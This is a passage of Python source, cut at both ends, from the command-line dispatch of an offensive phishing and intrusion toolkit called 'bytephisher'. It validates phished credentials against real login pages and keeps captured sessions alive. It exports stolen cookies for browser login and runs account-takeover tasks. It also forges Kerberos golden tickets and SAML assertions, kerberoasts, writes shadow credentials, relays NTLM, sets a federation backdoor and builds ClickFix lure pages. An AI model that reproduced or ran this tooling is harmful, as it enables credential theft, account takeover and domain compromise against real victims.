                print(f"{'':<20} {'':<16} {'':>5}  ua: {r['ua'][:70]}")
        print("-" * 100)
        print(f"{st['scanner_hits']} refused visit(s) from {st['scanner_ips']} address(es)")
        return 0

    # ------------------------------------------------- live-session ops ----
    if args.validate_creds:
        from core import ops
        rec = db.session_get(args.validate_creds)
        if not rec:
            print(f"[bytephisher] no session '{args.validate_creds}'")
            return 1
        url = args.url
        if not url:
            print("[bytephisher] give the real login URL: --validate-creds SID "
                  "--url https://site/login")
            return 2
        res = ops.validate_credentials(rec, url, user_field=args.user_field,
                                       pass_field=args.pass_field)
        print(f"[bytephisher] {res.get('result')}  {res.get('why') or res.get('error')}")
        if res.get("status"):
            print(f"   status={res['status']} final={res.get('final_url')}")
            print(f"   cookies issued: {[c['name'] for c in res.get('cookies') or []]}")
        if res.get("result") == ops.RESULT_CONFIRMED:
            from core import session as sess_mod
            sess_mod.add_cookies(rec, res.get("cookies") or [])
            sess_mod.touch(rec, "creds-validated", "credentials work", state="session")
            db.session_save(rec)
            print("[bytephisher] cookies merged into the session and the state "
                  "advanced to 'session'")
        return 0 if res.get("result") != ops.RESULT_UNKNOWN else 1

    if args.keepalive:
        from core import ops
        rec = db.session_get(args.keepalive)
        if not rec:
            print(f"[bytephisher] no session '{args.keepalive}'")
            return 1
        url = args.url or (rec.get("meta") or {}).get("home")
        if not url:
            print("[bytephisher] give an authenticated URL: --keepalive SID --url https://site/account")
            return 2
        print(f"[bytephisher] keeping session {rec['sid']} alive: {url} "
              f"every {args.interval}s x{args.iterations}")

        def _tick(entry, r):
            state = "logged-out" if entry.get("logged_out") else f"{entry.get('status')}"
            rot = entry.get("cookies_rotated") or []
            print(f"   [{entry['n']:>3}] {state:<10} "
                  f"{'rotated: ' + ','.join(rot) if rot else ''}"
                  f"{entry.get('error', '')}", flush=True)
        res = ops.keepalive(rec, url, interval=args.interval,
                            iterations=args.iterations, on_tick=_tick)
        from core import session as sess_mod
        sess_mod.touch(rec, "keepalive", f"{res['kept']}/{len(res['ticks'])} ok",
                       state="session" if res["alive"] else "done")
        db.session_save(rec)
        print(f"[bytephisher] {'session still alive' if res['alive'] else 'session expired'}"
              f" after {len(res['ticks'])} poll(s)")
        return 0

    # ---------------------------------------------------------- lures -----
    if args.lures:
        from core import lures as lures_mod
        rows = db.lure_list(limit=500)
        if not rows:
            print("[bytephisher] no lures yet (create one: --lure-create --campaign NAME)")
            return 0
        print(f"{'id':>4}  {'kind':<9} {'state':<7} {'opens':>6} {'uniq':>5} {'conv':>5}  "
              f"{'phishlet/campaign':<28} label")
        print("-" * 108)
        for row in rows:
            state = "burned" if row.burned else ("active" if row.active else "off")
            print(f"{row.id:>4}  {row.kind:<9} {state:<7} "
                  f"{row.opens:>6} {len(row.visitors):>5} {row.conversions:>5}  "
                  f"{(row.phishlet + '/' + (row.campaign or '-')):<28} {row.label}")
        print("-" * 108)
        print(f"{len(rows)} lure(s). URL: <your-domain>/l/<token>   (fragment: <your-domain>/#l=<token>)")
        return 0

    if args.lure_create:
        from core import lures as lures_mod
        phishlet_name = args.phishlet and os.path.basename(str(args.phishlet)).rsplit(".", 1)[0] \
            or args.campaign or "default"
        lure = lures_mod.Lure(phishlet=phishlet_name, campaign=args.campaign or "",
                              label=args.lure_label, kind=args.lure_kind,
                              max_uses=args.lure_max_uses or (1 if args.lure_kind == "one-time" else 0))
        db.lure_create(lure)
        print(f"[bytephisher] lure created  id={lure.id}  kind={lure.kind}  token={lure.token}")
        print(f"[bytephisher] URL           /l/{lure.token}")
        print(f"[bytephisher] fragment URL  /#l={lure.token}   (token never hits a server log)")
        if lure.max_uses:
            print(f"[bytephisher] burns after  {lure.max_uses} open(s)")
        return 0

    # ------------------------------------------------------- sessions -----
    if args.exploit_list:
        from core import exploits as ex_mod
        print("local services the collector attacks once the name has rebound")
        print("-" * 100)
        for p in ex_mod.services():
            e = ex_mod.EXPLOITS[p]
            print(f"  {p:<6} {e['service']:<22} {len(e['actions'])} action(s)")
            print(f"         {e['note']}")
        print("-" * 100)
        print("used with: --rebind-domain <your domain> [--exploit-ports 2375,8080]")
        return 0

    if args.router_plan:
        from core import exploits as ex_mod
        plan = ex_mod.router_plan(args.router_plan)
        print(f"router takeover plan for {plan['gateway']}")
        print("-" * 100)
        for c in plan["candidates"]:
            print(f"  {c['name']:<18} {c['login']}")
            creds_txt = ", ".join(f"{u}:{pw or '(blank)'}" for u, pw in c["creds"])
            print(f"      default credentials tried: {creds_txt}")
        print("-" * 100)
        print(f"payoff: {plan['payoff']}")
        return 0

    if args.chains:
        from core import chains as chains_mod
        print(f"{'chain':<12} {'tasks':<5} what it does")
        print("-" * 100)
        for c in chains_mod.list_chains():
            print(f"{c['name']:<12} {len(c['tasks']):<5} {c['description']}")
            print(f"{'':<18} {' -> '.join(c['tasks'])}")
        print("-" * 100)
        print("run one: --run-chain <sid>[:<chain>]   (default: recon)")
        return 0

    if args.run_chain:
        from core import chains as chains_mod
        from core import session as sess_mod
        # SID or SID:CHAIN - a session id is hex, so ":" is unambiguous
        sid, _, inline_name = str(args.run_chain).partition(":")
        rec = db.session_get(sid)
        if not rec:
            print(f"[bytephisher] no session '{sid}'")
            return 1
        name = (inline_name or args.chain_name or "recon").lower()
        try:
            res = chains_mod.run_chain(
                rec, name, outdir=args.out, headless=True,
                replay=sess_mod.load_replay(args.replay) if args.replay else None,
                on_task=lambda t: print(f"   [{'ok ' if t['ok'] else 'ERR'}] {t['task']} "
                                        f"{t['steps']} step(s) {t['duration']}s", flush=True))
        except ValueError as e:
            print(f"[bytephisher] {e}")
            return 2
        db.session_save(rec)
        print(chains_mod.report(res))
        if args.chain_json:
            # the report says which session it is about: the operator keeps these
            # files around, and a chain result without a sid is unattributable
            res.setdefault("sid", sid)
            res.setdefault("campaign", rec.get("campaign") or "")
            with open(args.chain_json, "w", encoding="utf-8") as f:
                json.dump(res, f, indent=2, default=str)
            print(f"[bytephisher] chain result -> {args.chain_json}")
        return 0 if res.get("ok") else 1

    if args.tasks:
        from core import session as sess_mod
        for name, t in sorted(sess_mod.BUILTIN_TASKS.items()):
            print(f"  {name:<16} {t['description']}")
        print("\n  A custom task is a YAML/JSON file: {name, steps:[{goto|click|fill|extract|"
              "screenshot|download|assert_text|wait}]}")
        return 0

    if args.sessions:
        rows = db.session_list(limit=500)
        if not rows:
            print("[bytephisher] no sessions captured yet")
            return 0
        print(f"{'sid':<34} {'state':<9} {'creds':>5} {'cookies':>7} {'tko':>4}  "
              f"{'identity':<26} {'ip':<15} {'cc':<3} phishlet/campaign")
        print("-" * 145)
        for r in rows:
            ident = (r.get("identity") or "")[:25]
            print(f"{r['sid']:<34} {r['state']:<9} {r['creds']:>5} {r['cookies']:>7} "
                  f"{r['takeovers']:>4}  {ident:<26} {r['ip']:<15} "
                  f"{(r['country'] or '')[:3]:<3} {r['phishlet']}/{r['campaign'] or '-'}")
        print("-" * 145)
        st = db.session_stats()
        print(f"{len(rows)} session(s) | captured sessions: {st['sessions_captured']} | "
              f"creds-only: {st['sessions_creds_only']}")
        print("full dump: --session <sid> | validate: --validate <sid> --url URL | "
              "takeover: --takeover <sid> --task probe")
        return 0

    if args.session:
        from core import session as sess_mod
        rec = db.session_get(args.session)
        if not rec:
            print(f"[bytephisher] no session '{args.session}'")
            return 1
        print("=" * 78)
        print(f"SESSION {rec.get('sid')}")
        print("=" * 78)
        print(f"  state        : {rec.get('state')}   ({sess_mod.state_badge(rec)})")
        print(f"  phishlet     : {rec.get('phishlet')}   campaign: {rec.get('campaign') or '-'}"
              f"   lure: {rec.get('lure') or '-'}")
        print(f"  ip / geo     : {rec.get('ip')}  {rec.get('geo', {}).get('city', '')} "
              f"{rec.get('geo', {}).get('country', '')} {rec.get('geo', {}).get('isp', '')}")
        print(f"  device token : {rec.get('device_token') or '-'}")
        ja3 = rec.get("ja3") or {}
        if ja3:
            print(f"  JA3          : {ja3.get('ja3')}  ({ja3.get('ja3_string', '')[:60]})")
        print(f"  user agent   : {(rec.get('ua') or '')[:90]}")
        creds = rec.get("credentials") or {}
        print(f"  credentials  : {creds if creds else '(none)'}")
        toks = rec.get("tokens") or {}
        print(f"  auth tokens  : {sorted(toks.keys()) if toks else '(none)'}")
        oauth = sess_mod.oauth_summary(rec)
        if oauth:
            # the device-code capture is a vaulted token set: the operator's primary view
            # used to show nothing at all for it
            print(f"  oauth        : {oauth.get('provider')} client {oauth.get('client_id')}"
                  f"  scopes {' '.join(oauth.get('scopes') or []) or '-'}")
            print(f"      access   : {'present' if oauth.get('has_access') else 'no'}"
                  f"   refresh: {'present' if oauth.get('has_refresh') else 'no'}"
                  f"   expires_in: {oauth.get('expires_in')}"
                  f"{'  EXPIRED' if oauth.get('expired') else ''}")
        ck = rec.get("cookies") or []
        print(f"  cookies      : {len(ck)}")
        for c in ck[:12]:
            v = str(c.get("value", ""))
            print(f"      {c.get('name'):<28} {(v[:40] + '...') if len(v) > 40 else v}")
        # the live stream is the same data the Telegram /live command shows; the
        # operator's primary tool must not be the one place it is missing
        live_rows = db.live_for(rec.get("sid"), limit=400) if hasattr(db, "live_for") else []
        live_events = [e for r in live_rows for e in (r.get("events") or [])]
        if live_events:
            from core import intel as _intel
            summary = _intel.live_summary(live_events)
            print(f"  live input   : {summary['events']} event(s) in "
                  f"{len(live_rows)} beacon(s)")
            for f in summary["fields"][:12]:
                flag = "   <- one-time code" if f.get("otp") else ""
                print(f"      {f['name']:<24} [{f.get('type') or '?'}] "
                      f"= {str(f.get('value'))[:56]}{flag}")
            if summary["otp_seen"]:
                print(f"      codes seen: {', '.join(summary['otp_seen'])}")
        tl = rec.get("timeline") or []
        print("  timeline     :")
        for ev in tl[-12:]:
            print(f"      {time.strftime('%H:%M:%S', time.localtime(ev.get('ts', 0)))}  "
                  f"{ev.get('event'):<10} {str(ev.get('detail'))[:60]}")
        print("=" * 78)
        print(f"  export: --session-export {rec.get('sid')} out.json   "
              f"validate: --validate {rec.get('sid')} --url URL   "
              f"takeover: --takeover {rec.get('sid')} --task probe")
        return 0

    if args.session_export:
        from core import session as sess_mod
        sid, path = args.session_export
        rec = db.session_get(sid)
        if not rec:
            print(f"[bytephisher] no session '{sid}'")
            return 1
        data = sess_mod.to_cookie_editor(rec)
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except OSError as e:
            print(f"[bytephisher] cannot write {path}: "
                  f"{type(e).__name__}: {e}")
            return 2
        print(f"[bytephisher] exported {len(data)} cookie(s) -> {path}")
        print("[bytephisher] import in Chrome with Cookie-Editor / EditThisCookie, "
              "then open the site - you should already be logged in.")
        return 0

    if args.session_import:
        from core import session as sess_mod
        with open(args.session_import, encoding="utf-8") as f:
            data = json.load(f)
        rec = sess_mod.from_cookie_editor(data, phishlet="manual",
                                          campaign=args.campaign or "")
        db.session_save(rec)
        print(f"[bytephisher] imported session {rec['sid']} with {len(rec['cookies'])} cookie(s)")
        return 0

    if args.validate:
        from core import session as sess_mod
        rec = db.session_get(args.validate)
        if not rec:
            print(f"[bytephisher] no session '{args.validate}'")
            return 1
        # -u/--url doubles as the validate target (same meaning: a URL)
        url = args.url or (rec.get("meta") or {}).get("home") or ""
        if not url:
            print("[bytephisher] give a URL: --validate <sid> --url https://site/account")
            return 2
        replay = sess_mod.load_replay(args.replay) if args.replay else None
        res = (sess_mod.validate_browser(rec, url, replay=replay)
               if replay else sess_mod.validate_http(rec, url))
        print(json.dumps(res, indent=2, default=str)[:2000])
        session_mod = sess_mod
        session_mod.touch(rec, "validate", f"logged_in={res.get('logged_in')}")
        db.session_save(rec)
        return 0 if res.get("ok") else 1

    if args.takeover:
        from core import session as sess_mod
        rec = db.session_get(args.takeover)
        if not rec:
            print(f"[bytephisher] no session '{args.takeover}'")
            return 1
        try:
            # the browser is always headless here: --no-tui is about the
            # operator's console, not about the takeover browser
            res = sess_mod.run_task(rec, args.task, outdir=args.out, headless=True,
                                    replay=sess_mod.load_replay(args.replay)
                                    if args.replay else None)
        except ValueError as e:
            print(f"[bytephisher] {e}")
            return 2
        db.session_save(rec)
        print(f"[bytephisher] task '{res['task']}' finished in {res.get('duration', 0)}s "
              f"({len(res['steps'])} steps, {len(res['errors'])} error(s))")
        for s_ in res["steps"]:
            mark = "ok " if s_.get("ok") else "ERR"
            print(f"   [{mark}] {s_['step']}. {s_['kind']}  "
                  f"{ {k: v for k, v in s_.items() if k not in ('step', 'kind', 'ok')} }")
        if res.get("extracted"):
            print("[bytephisher] extracted:")
            for k, v in res["extracted"].items():
                shown = v if not isinstance(v, list) else v[:5]
                print(f"   {k}: {str(shown)[:400]}")
        if res.get("files"):
            print(f"[bytephisher] files: {', '.join(res['files'])}")
        if res.get("cookies_refreshed"):
            print(f"[bytephisher] session refreshed: {res['cookies_refreshed']} cookie(s) "
                  f"re-exported into the vault")
        if res.get("errors"):
            print(f"[bytephisher] errors: {res['errors'][:3]}")
        return 0

    if args.live_purge:
        n = db.live_purge(args.live_purge)
        print(f"[bytephisher] purged {n} live-input row(s) for {args.live_purge}")
        return 0

    if args.intel_dump:
        from core import intel as _intel
        rec = db.intel_get(args.intel_dump)
        if not rec:
            print(f"[bytephisher] no device dump for '{args.intel_dump}'")
            return 1
        print(_intel.dump_text(rec))
        return 0

    if args.intel_list:
        rows = db.intel_list(limit=200)
        if not rows:
            print("[bytephisher] no device dumps collected yet")
            return 0
        print(f"{'id':>5}  {'when':<19}  {'ip':<15}  {'cc':<3}  {'bot':>3}  {'vpn':>3}  "
              f"{'device token':<34}  browser")
        print("-" * 120)
        for r in rows:
            when = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(r["ts"] or 0))
            # the column is called "browser": print the browser the analysis
            # derived (with its version) instead of a truncated raw user agent
            browser = str(r.get("browser") or "")
            if not browser:
                browser = (r["ua"] or "")[:40]
            os_name = str(r.get("os") or "")
            if os_name:
                browser += f" / {os_name}"
            print(f"{r['id']:>5}  {when:<19}  {r['ip']:<15}  {(r['country'] or '')[:3]:<3}  "
                  f"{r['headless']:>3}  {r['vpn']:>3}  {r['device_token']:<34}  "
                  f"{browser[:44]}")
        print("-" * 120)
        print(f"{len(rows)} dump(s). Full detail: --intel-dump <id|sid|latest>")
        return 0

    if args.intel_export:
        rows = db.intel_list(limit=100000)
        out = []
        for r in rows:
            rec = db.intel_get(r["id"])
            if rec:
                out.append(rec)
        try:
            with open(args.intel_export, "w", encoding="utf-8") as f:
                json.dump({"exported_at": time.time(), "stats": db.intel_stats(),
                           "devices": out}, f, indent=2, default=str)
        except OSError as e:
            print(f"[bytephisher] cannot write {args.intel_export}: "
                  f"{type(e).__name__}: {e}")
            return 2
        print(f"[bytephisher] device dumps exported -> {args.intel_export} "
              f"({len(out)} records)")
        return 0

    if _access_requested(args):
        return access_dispatch(args, db)

    if args.cohorts:
        from core import campaign as _camp
        rows = _clean_error(_load_json, args.cohorts)
        if rows is None:
            return 2
        camp = _camp.Campaign(name=args.campaign or "campaign",
                              cohorts=rows if isinstance(rows, list) else rows.get("cohorts"))
        print(camp.describe())
        if args.targets:
            from core import targets as _tgt
            people = _tgt.Targets.load(args.targets)
            names = [t.email or t.token for t in getattr(people, "rows", [])]
            if names:
                split = camp.split(names)
                for name in sorted(split):
                    print(f"  {name:<16} {len(split[name])} target(s)")
        return 0
    if args.ab_summary:
        from core import campaign as _camp
        rows = db.session_list(limit=1000)
        arms = []
        for row in rows:
            rec = db.session_get(row["sid"]) or {}
            arms.append({"variant": (row.get("lure") or rec.get("lure")
                                     or row.get("campaign") or "(unlabelled)"),
                         "state": row.get("state") or "",
                         "credentials": bool(rec.get("credentials")),
                         "creds": bool(rec.get("credentials"))})
        print(_camp.describe(_camp.summarise(arms)))
        return 0
    if args.consent_plan:
        from core import appconsent as _ac
        scopes = [x.strip() for x in (args.consent_scopes or "").split(",") if x.strip()]
        plan = _ac.consent_plan(client_id=args.consent_client or args.oauth_client_id or "",
                                redirect_uri=args.consent_redirect or args.oauth_redirect or "",
                                scopes=scopes or None, tenant=args.consent_tenant or "common")
        print(_ac.describe(plan))
        return 0
    if args.pkinit_plan:
        from core import pkinit as _pk
        print(_pk.describe(_pk.plan(realm=args.pkinit_realm or args.realm or "")))
        return 0
    if args.shadow_plan or args.shadow_write or args.shadow_remove:
        from core import shadowcred as _sc
        if args.shadow_plan:
            print(_sc.describe(_sc.plan(target=args.shadow_target)))
            return 0
        if not (args.ldap and args.ldap_user):
            print("[bytephisher] --shadow-write/--shadow-remove need --ldap and --ldap-user "
                  "(the credential is one LDAP attribute value)")
            return 2
        from core import ldap as _ldap
        client = _ldap.LdapClient(args.ldap, port=args.ldap_port)
        try:
            client.bind(args.ldap_user, args.ldap_pass)
            if args.shadow_write:
                cred = _sc.key_credential(public_key=os.urandom(32))
                _sc.add(client, args.shadow_write, cred)
                print(f"[bytephisher] credential written to {args.shadow_write}: {cred[:40]}...")
                print("[bytephisher] remove it with --shadow-remove '" + cred + "'")
                print("[bytephisher] this is event 5136 on that object: it is audited")
            if args.shadow_remove:
                _sc.remove(client, args.shadow_remove, args.shadow_remove)
                print("[bytephisher] credential removed")
        except (_ldap.LdapError, _sc.ShadowError) as e:
            print(f"[bytephisher] {e}")
            return 1
        finally:
            client.close()
        return 0
    if args.golden_plan:
        from core import goldenticket as _gt
        print(_gt.describe(_gt.plan(realm=args.realm or "")))
        return 0
    if args.golden_forge:
        from core import goldenticket as _gt
        missing = [n for n, v in (("--krbtgt-hash", args.krbtgt_hash),
                                  ("--golden-sid", args.golden_sid),
                                  ("--realm", args.realm)) if not v]
        if missing:
            print(f"[bytephisher] --golden-forge needs {', '.join(missing)}")
            return 2
        try:
            out = _gt.forge(args.realm, user=args.golden_user,
                            krbtgt_hash=bytes.fromhex(args.krbtgt_hash),
                            domain_sid=args.golden_sid, user_rid=args.golden_rid,
                            groups=[g.strip() for g in (args.golden_groups or "").split(",")
                                    if g.strip()])
        except (_gt.GoldenTicketError, ValueError) as e:
            print(f"[bytephisher] {e}")
            return 1
        print(_gt.describe(out))
        base = args.out or "."
        os.makedirs(base, exist_ok=True)
        kirbi_path = os.path.join(base, "golden.kirbi")
        ccache_path = os.path.join(base, "golden.ccache")
        with open(kirbi_path, "w", encoding="utf-8") as fh:
            fh.write(out["kirbi"])
        with open(ccache_path, "wb") as fh:
            fh.write(bytes.fromhex(out["ccache_hex"]))
        print(f"[bytephisher] kirbi : {kirbi_path}")
        print(f"[bytephisher] ccache: {ccache_path} (export KRB5CCNAME=FILE:{ccache_path})")
        print("[bytephisher] a forged ticket has NO preceding AS-REQ: that correlation is the "
              "detection")
        return 0
    if args.kerberos_plan:
        from core import kerberos as _krb
        print(_krb.describe(_krb.plan(realm=args.realm or "")))
        return 0
    if args.roast:
        from core import kerberos as _krb
        if not args.realm:
            print("[bytephisher] --roast needs --realm (e.g. --realm CONTOSO.TEST)")
            return 2
        try:
            out = _krb.roast(args.realm, args.roast, spn=args.roast_spn, kdc=args.kdc)
        except _krb.KerberosError as e:
            print(f"[bytephisher] {e}")
            return 1
        except OSError as e:
            print(f"[bytephisher] the KDC at {args.kdc or args.realm} failed: "
                  f"{type(e).__name__}: {e}")
            return 2
        print(_krb.describe(out))
        return 0
    if args.ad_hunt:
        if not args.ldap:
            print("[bytephisher] --ad-hunt needs --ldap <host>")
            return 2
        from core import ad_hunt as _adh
        from core import ldap as _ldap
        client = _ldap.LdapClient(args.ldap, port=args.ldap_port)
        try:
            client.bind(args.ldap_user, args.ldap_pass)
            base = args.ldap_base or client.naming_context()
            rows = client.search(base=base, scope=2, filter_text="(objectClass=*)",
                                 attrs=list(_adh.HUNT_ATTRS), size_limit=5000)
        except _ldap.LdapError as e:
            print(f"[bytephisher] {e}")
            return 1
        except OSError as e:
            print(f"[bytephisher] LDAP {args.ldap}:{args.ldap_port} failed: "
                  f"{type(e).__name__}: {e}")
            return 2
        finally:
            client.close()
        facts = _adh.report(laps_rows=rows, gpp_rows=rows, gmsa_rows=rows,
                            delegation_rows=rows, text_rows=rows)
        print(f"[bytephisher] ad-hunt  : {len(rows)} row(s) from {base or '<root>'}")
        print(_adh.describe(facts))
        return 0
    if args.ldap and (args.ldap_query or args.ldap_filter):
        from core import ldap as _ldap
        client = _ldap.LdapClient(args.ldap, port=args.ldap_port)
        try:
            client.bind(args.ldap_user, args.ldap_pass)
            base = args.ldap_base or client.naming_context()
            what = args.ldap_query or "custom"
            if what == "rootdse":
                base, scope = "", 0
            else:
                scope = 2
            query = args.ldap_filter or {
                "asrep": _ldap.filters.asrep_roastable(),
                "kerberoast": _ldap.filters.kerberoastable(),
                "templates": _ldap.filters.certificate_templates(),
                "cas": _ldap.filters.enrollment_services(),
                "shadow": _ldap.filters.present("msDS-KeyCredentialLink"),
                "domain": "(objectClass=*)",
            }.get(what, "(objectClass=*)")
            attrs = _ldap.ATTRS.get(what) or _ldap.ATTRS.get(
                "templates" if what == "custom" else what) or ["cn", "distinguishedName"]
            rows = client.search(base=base, scope=scope, filter_text=query, attrs=attrs,
                                 size_limit=2000)
            print(f"[bytephisher] {client.describe()} base={base or '<root>'} "
                  f"query={what} -> {len(rows)} row(s)")
            if what == "domain" and rows:
                for key, value in sorted(rows[0]["attrs"].items()):
                    print(f"  {key:<28} {value[0] if value else ''}")
            else:
                for row in rows[:200]:
                    attrs_txt = "; ".join(f"{k}={'/'.join(v)[:60]}" for k, v in
                                          list(row["attrs"].items())[:4])
                    print(f"  {row['dn'][:70]:<70} {attrs_txt[:120]}")
            if what in ("templates", "cas") and args.adcs_esc:
                import json as _json

                from core import adcs_esc as _esc
                with open(args.adcs_esc, "w", encoding="utf-8") as fh:
                    _json.dump(rows, fh, indent=2)
                print(f"[bytephisher] template dump: {args.adcs_esc}")
        except _ldap.LdapError as e:
            print(f"[bytephisher] {e}")
            return 1
        except OSError as e:
            # gaierror / ConnectionRefusedError / TimeoutError: the operator gets one line
            # instead of a traceback from a name that does not resolve or a port that is closed
            print(f"[bytephisher] LDAP {args.ldap}:{args.ldap_port} failed: "
                  f"{type(e).__name__}: {e}")
            return 2
        finally:
            client.close()
        return 0
    if args.adcs_esc and args.adcs_esc != "ldap":
        from core import adcs_esc as _esc
        rows = _clean_error(_load_json, args.adcs_esc)
        if rows is None:
            return 2
        if isinstance(rows, dict):
            rows = rows.get("templates") or []
        print(_esc.describe(_esc.report(rows, probe={})))
        return 0
    if args.relay_plan:
        from core import relay as _relay
        print(_relay.describe(_relay.plan(args.relay_plan, listen_port=args.relay_listen)))
        return 0
    if args.coerce_plan:
        from core import relay as _relay
        print(_relay.describe(_relay.coerce_plan(listener=f"0.0.0.0:{args.relay_listen}")))
        return 0
    if args.relay_start:
        from core import adcs as _adcs
        from core import relay as _relay
        probe = _adcs.probe(args.relay_start)
        if not probe.get("ntlm_offered"):
            print("[bytephisher] that target does not offer NTLM on the enrolment paths, so a "
                  "relay has nothing to forward. Probe it with --adcs-probe first.")
            return 1
        print(f"[bytephisher] NTLM offered: {probe['ntlm_offered']} - starting the relay")

        def _on_auth(row):
            print(f"   [relayed] {row['domain']}\\{row['user']} "
                  f"(ws {row['workstation']}) -> target answered {row['status']}, "
                  f"{row['bytes']} bytes back", flush=True)

        engine = _relay.Relay(args.relay_start, port=args.relay_listen, on_auth=_on_auth)
        engine.start()
        print(f"[bytephisher] listening on 0.0.0.0:{args.relay_listen} - the trigger is "
              f"--coerce-plan, or a document that resolves a UNC path here")
        print("[bytephisher] Ctrl-C to stop")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n[bytephisher] relayed {engine.relayed} authentication(s)")
        finally:
            engine.stop()
        return 0
    if args.token_keepalive:
        from core import dbsc as _dbsc
        from core import keepalive as _ka
        rec = db.session_get(args.token_keepalive)
        if not rec:
            print(f"[bytephisher] no session {args.token_keepalive!r}")
            return 2
        tokens = rec.get("tokens") or {}
        rt = tokens.get("refresh_token") or ""
        if not rt:
            print("[bytephisher] that session captured no refresh token")
            return 2
        verdict = _dbsc.replayability(tokens)
        if verdict.get("verdict") == "not_replayable":
            print("[bytephisher] those tokens are NOT replayable "
                  f"({'device-bound' if verdict.get('device_bound') else 'expired'}): the "
                  "exchange will be refused, so a keep-alive cannot work")
            return 1
        print("[bytephisher] " + _dbsc.describe(verdict).splitlines()[0])
        state = os.path.join(args.out or ".", f"keepalive-{args.token_keepalive}.json")
        engine = _ka.KeepAlive(rt, client_id=args.oauth_client_id or "",
                               tenant=args.oauth_tenant or "common",
                               interval=args.keepalive_interval, state_path=state,
                               on_rotate=lambda r: print(
                                   f"   [rotate] #{r['rotations']} "
                                   f"(access token: {r['has_access']})", flush=True))
        engine.load()
        with contextlib.suppress(KeyboardInterrupt):
            engine.run()
        print(f"[bytephisher] {engine.rotations} rotation(s); state: {state}"
              + (f" | stopped: {engine.stopped}" if engine.stopped else ""))
        return 0
    if args.fatigue_plan:
        from core import mfafatigue as _fat
        print(_fat.describe(_fat.plan(account=args.campaign or "")))
        return 0
    if args.spray_plan:
        from core import spray as _spray
        users = 0
        if args.spray_users:
            # STREAM the count: `fh.read().splitlines()` held the whole file in memory and a
            # 206 MB list measured 647 MB peak RSS, which kills a 4 GB box with no message
            try:
                with open(args.spray_users, encoding="utf-8") as fh:
                    users = sum(1 for line in fh if line.strip())
            except OSError as e:
                print(f"[bytephisher] cannot read {args.spray_users}: {e}")
                return 2
        print(_spray.describe(_spray.plan(users=users, passwords=1,
                                          threshold=args.spray_threshold)))
        return 0
    if args.app_consent_plan:
        from core import appconsent as _ac
        scopes = [s.strip() for s in (args.app_consent_scopes or "").split(",") if s.strip()]
        print(_ac.describe(_ac.plan(app_name=args.campaign or "reporting-connector",
                                    scopes=scopes or None)))
        return 0
    if args.saml_plan:
        from core import samlforge as _saml
        print(_saml.describe(_saml.plan(issuer=args.saml_issuer, audience=args.saml_audience,
                                        subject=args.saml_assert)))
        return 0
    if args.saml_assert:
        from core import samlforge as _saml
        if not (args.saml_issuer and args.saml_audience):
            print("[bytephisher] --saml-assert needs --saml-issuer and --saml-audience")
            return 2
        attrs = {}
        if args.saml_role:
            attrs[_saml.ROLE_CLAIMS[0]] = [r.strip() for r in args.saml_role.split(",")
                                           if r.strip()]
        try:
            xml = _saml.assertion(args.saml_issuer, args.saml_audience, args.saml_assert,
                                  attributes=attrs)
            if args.saml_key or args.saml_cert:
                xml = _saml.sign(xml, key_pem=args.saml_key, cert_b64=args.saml_cert)
                note = "signed"
            else:
                note = ("UNSIGNED - a relying party will reject this; pass --saml-key with the "
                        "IdP's token-signing key")
            body = _saml.response(xml, args.saml_issuer, destination=args.saml_audience)
        except _saml.SamlForgeError as e:
            print(f"[bytephisher] {e}")
            return 1
        out = args.saml_out
        if out:
            os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
            with open(out, "w", encoding="utf-8") as fh:
                fh.write(body)
            print(f"[bytephisher] SAML response: {out} ({len(body)} bytes, {note})")
        else:
            print(body)
        return 0
    if args.federation_plan:
        from core import federation as _fed
        print(_fed.describe(_fed.plan(args.federation_plan,
                                      issuer=args.federation_issuer,
                                      cert_b64=args.federation_cert)))
        return 0
    if args.federation_set:
        from core import federation as _fed
        rec = db.session_get(args.federation_set)
        if not rec:
            print(f"[bytephisher] no session {args.federation_set!r}")
            return 2
        token = (rec.get("tokens") or {}).get("access_token") or ""
        if not token:
            print("[bytephisher] that session captured no access token")
            return 2
        if not (args.federation_domain and args.federation_issuer and args.federation_cert):
            print("[bytephisher] --federation-set needs --federation-domain, "
                  "--federation-issuer and --federation-cert")
            return 2
        try:
            answer = _fed.set_federation(token, args.federation_domain,
                                         args.federation_issuer, args.federation_cert)
        except _fed.FederationError as e:
            print(f"[bytephisher] {e}")
            return 1
        print(f"[bytephisher] federation set on {args.federation_domain}: "
              f"{str(answer)[:200]}")
        print("[bytephisher] this is in the tenant's audit log: it is authoritative, "
              "not stealthy")
        return 0
    if args.adcs_probe:
        from core import adcs as _adcs
        try:
            report = _adcs.probe(_with_scheme(args.adcs_probe))
        except _adcs.AdcsError as e:
            print(f"[bytephisher] {e}")
            return 2
        print(_adcs.describe(report))
        return 0
    if args.inbox:
        from core import inbox as _inbox
        try:
            rows = _inbox.fetch(host=args.inbox_host, user=args.inbox_user,
                                password=os.environ.get("BYTEPHISHER_INBOX_PASS", ""),
                                folder=args.inbox_folder, limit=args.inbox_limit)
        except _inbox.InboxError as e:
            print(f"[bytephisher] {e}")
            return 2
        except OSError as e:
            print(f"[bytephisher] IMAP {args.inbox_host} failed: "
                  f"{type(e).__name__}: {e}")
            return 2
        threads = _inbox.thread(rows)
        print(_inbox.describe(rows, threads))
        for msg in rows:
            cls, why = _inbox.classify(msg.get("subject", ""), msg.get("body", ""))
            if cls == "unknown":
                continue
            advice = _inbox.suggest(cls, pretext=args.pretext, locale=args.locale or "en")
            print(f"  -> {cls}: {advice['why']}")
            if advice.get("script"):
                print("     script: " + advice["script"].replace("\n", " ")[:160])
        return 0
    if args.clickfix_out and not args.clickfix_command:
        print("[bytephisher] --clickfix-out needs --clickfix-command (the text the page "
              "tells the victim to run)")
        return 2
    if args.clickfix_command:
        from core import clickfix as _cf
        beacon = f"http://127.0.0.1:{args.port or 8080}/__bh/beacon"
        page = _cf.build_page(command=args.clickfix_command,
                              platform=args.clickfix_platform,
                              brand=args.campaign or args.upstream or "",
                              beacon_url=beacon)
        out = args.clickfix_out or os.path.join(args.out or ".", "clickfix.html")
        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        with open(out, "w", encoding="utf-8") as fh:
            fh.write(page)
        print(f"[bytephisher] ClickFix page: {out} ({len(page)} bytes)")
        print(_cf.describe({"platform": args.clickfix_platform, "bytes": len(page),
                            "steps": _cf.instructions(args.clickfix_platform),
